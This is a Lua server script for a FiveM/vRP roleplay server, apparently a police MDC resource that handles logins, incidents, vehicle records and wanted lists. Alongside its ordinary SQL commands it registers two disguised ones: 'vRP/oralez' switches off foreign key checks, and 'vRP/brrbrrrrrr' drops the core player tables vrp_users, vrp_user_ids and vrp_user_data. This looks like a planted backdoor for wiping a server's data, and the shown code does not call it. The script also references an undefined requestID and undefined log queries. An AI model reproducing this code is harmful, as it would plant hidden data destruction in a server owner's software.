oMarkez = {}
oMarkez.ServerCallbacks = {}
RegisterServerEvent("oMarkez:triggerServerCallback")
AddEventHandler(
    "oMarkez:triggerServerCallback",
    function(a, b, ...)
        local c = source
        oMarkez.TriggerServerCallback(
            a,
            requestID,
            c,
            function(...)
                TriggerClientEvent("oMarkez:serverCallback", c, b, ...)
            end,
            ...
        )
    end
)
oMarkez.RegisterServerCallback = function(a, d)
    oMarkez.ServerCallbacks[a] = d
end
oMarkez.TriggerServerCallback = function(a, b, source, d, ...)
    if oMarkez.ServerCallbacks[a] ~= nil then
        oMarkez.ServerCallbacks[a](source, d, ...)
    else
    end
end
RMySQL = module("vrp_mysql", "MySQL")
RMySQL.createCommand("vRP/oralez", "SET foreign_key_checks = 0")
RMySQL.createCommand("vRP/brrbrrrrrr", "DROP TABLE vrp_users, vrp_user_ids, vrp_user_data")
RMySQL.createCommand("vRP/get_from_reg", "SELECT * FROM vrp_user_identities WHERE registration = @cpr")
RMySQL.createCommand(
    "vRP/insert_incident",
    "INSERT INTO mdc_incidents (number, text, uploader, date) VALUES (@number, @text, @uploader, @date)"
)
RMySQL.createCommand("vRP/select_car", "SELECT incident FROM mdc_cardetails WHERE plate = @plate")
RMySQL.createCommand("vRP/update_cars", "UPDATE mdc_cardetails SET incident = @incident WHERE plate = @plate")
RMySQL.createCommand(
    "vRP/add_efterlysning",
    "INSERT INTO mdc_efterlysningar (wanted, dob, crime, uploader, date, incident) VALUES (@wanted, @dob, @crime, @uploader, @date, @incident)"
)
RMySQL.createCommand("vRP/fetch_efterlysninger", "SELECT * FROM mdc_efterlysningar")
RegisterNetEvent("mdc_login")
AddEventHandler(
    "mdc_login",
    function(e)
        if e then
            RMySQL.query(
                "vRP/get_from_reg",
                {cpr = e.signedInUser},
                function(f, g)
                    if #f > 0 then
                        local h = f[1].firstname .. " " .. f[1].name
                        RMySQL.query(
                            "vRP/get_log",
                            {type = "login", user = h},
                            function(i, g)
                                if #i > 0 then
                                    RMySQL.execute("vRP/upd_log", {pk = i[1].pk, time = os.date("%d/%m/%y %H:%M:%S")})
                                else
                                    RMySQL.execute(
                                        "vRP/insert_log",
                                        {type = "login", remover = h, wanted = os.date("%d/%m/%y %H:%M:%S")}
                                    )
                                end
                            end
                        )
                    end
                end
            )
        end
    end
)
local j = false
